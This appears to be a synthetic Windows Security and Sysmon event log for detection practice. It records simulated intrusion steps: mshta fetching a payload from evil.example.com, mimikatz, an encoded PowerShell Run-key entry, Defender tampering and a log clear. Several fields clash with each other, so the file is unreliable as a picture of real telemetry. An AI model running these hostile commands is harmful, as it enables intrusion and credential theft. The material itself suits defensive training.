<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:27:34.0000000Z" /><EventRecordID>835</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5225-8799-2959-1001</Data><Data Name="TargetUserName">admin</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="IpPort">34612</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:27:45.0000000Z" /><EventRecordID>836</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8553-3219-6855-1001</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="IpPort">4490</Data><Data Name="ProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:28:02.0000000Z" /><EventRecordID>837</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0x938c</Data><Data Name="NewProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="ParentProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x419</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:28:22.0000000Z" /><EventRecordID>838</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:28:22.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">50324</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data><Data Name="Details">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:28:40.0000000Z" /><EventRecordID>839</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">.</Data><Data Name="ObjectName">C:\Windows\System32\drivers\rootkit.sys</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4719</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:29:07.0000000Z" /><EventRecordID>840</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="CategoryId">%%8273</Data><Data Name="SubcategoryId">%%13312</Data><Data Name="SubcategoryGuid">{0CCE922B-69AE-11D9-BED3-505054503030}</Data><Data Name="AuditPolicyChanges">%%8448</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:29:32.0000000Z" /><EventRecordID>841</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8944-7750-6575-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">7736</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:29:39.0000000Z" /><EventRecordID>842</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">31202</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:29:51.0000000Z" /><EventRecordID>843</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-6104-6940-3277-1001</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">59333</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" /><EventID>7045</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:29:59.0000000Z" /><EventRecordID>844</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>System</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="ServiceName">RemoteRegistry</Data><Data Name="ImagePath">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">demand start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:30:27.0000000Z" /><EventRecordID>845</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:30:27.0000000Z</Data><Data Name="EventType">CreateKey</Data><Data Name="ProcessId">46091</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\backdoor</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:30:31.0000000Z" /><EventRecordID>846</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">DC02</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:30:33.0000000Z" /><EventRecordID>847</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:30:33.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">13868</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="TargetObject">HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware</Data><Data Name="Details">cmd.exe /c whoami &amp;&amp; net user</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:30:37.0000000Z" /><EventRecordID>848</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5145-1709-2085-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">44774</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:31:07.0000000Z" /><EventRecordID>849</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:31:07.0000000Z</Data><Data Name="EventType">CreateKey</Data><Data Name="ProcessId">39509</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:31:10.0000000Z" /><EventRecordID>850</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">admin</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">56458</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:31:22.0000000Z" /><EventRecordID>851</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:31:22.0000000Z</Data><Data Name="EventType">CreateKey</Data><Data Name="ProcessId">57042</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetObject">HKLM\SYSTEM\CurrentControlSet\Services\mal_persist\ImagePath</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:31:36.0000000Z" /><EventRecordID>852</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="Workstation">LAPTOP-MGMT</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:31:59.0000000Z" /><EventRecordID>853</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:31:59.0000000Z</Data><Data Name="EventType">CreateKey</Data><Data Name="ProcessId">64193</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\backdoor</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:32:29.0000000Z" /><EventRecordID>854</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="NewProcessId">0x6dd0</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="ParentProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xc2b</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:32:41.0000000Z" /><EventRecordID>855</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:32:41.0000000Z</Data><Data Name="ProcessGuid">{0E96C-10032-94C5-12E5B}</Data><Data Name="ProcessId">15912</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="CommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="User">NT AUTHORITY\charlie</Data><Data Name="ParentProcessId">1948</Data><Data Name="ParentImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="ParentCommandLine">mshta.exe http://evil.example.com/payload.hta</Data><Data Name="Hashes">MD5=5142a51f6055457719ae3d1cfddd0c85,SHA256=2027cb2265cced7e355e24c3efe87a5cc43e69b43f25cc49f035a08e5df1ddb8</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:32:54.0000000Z" /><EventRecordID>856</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5646-8486-6111-1001</Data><Data Name="TargetUserName">admin</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">64998</Data><Data Name="ProcessName">C:\Windows\System32\net.exe</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:33:02.0000000Z" /><EventRecordID>857</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="TargetServerName">SRV-FILE01</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:33:19.0000000Z" /><EventRecordID>858</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-2392-2953-3348-1001</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">27279</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="WorkstationName">SRV-SQL01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:33:30.0000000Z" /><EventRecordID>859</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-4281-7623-3011-1001</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">55950</Data><Data Name="ProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:33:49.0000000Z" /><EventRecordID>860</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:33:49.0000000Z</Data><Data Name="ProcessId">18889</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TargetFilename">C:\Users\alice\Downloads\invoice_scan.pdf.exe</Data><Data Name="CreationUtcTime">2024-11-25T12:33:49.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:34:11.0000000Z" /><EventRecordID>861</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:34:11.0000000Z</Data><Data Name="EventType">DeleteKey</Data><Data Name="ProcessId">32754</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TargetObject">HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Eventlog" /><EventID>1102</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:34:15.0000000Z" /><EventRecordID>862</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="SubjectLogonId">0x2f47d9</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:34:17.0000000Z" /><EventRecordID>863</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="SubjectLogonId">0x179bf5</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:34:23.0000000Z" /><EventRecordID>864</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7269-6356-3502-1001</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">41785</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="WorkstationName">DC01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:34:30.0000000Z" /><EventRecordID>865</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5809-9157-9032-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">18172</Data><Data Name="ProcessName">C:\Windows\System32\reg.exe</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:34:59.0000000Z" /><EventRecordID>866</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0x7235</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="ParentProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x833</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:35:05.0000000Z" /><EventRecordID>867</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0xf27b</Data><Data Name="NewProcessName">C:\Windows\System32\net.exe</Data><Data Name="CommandLine">svchost.exe -k netsvcs</Data><Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xc4c</Data></EventData></Event>
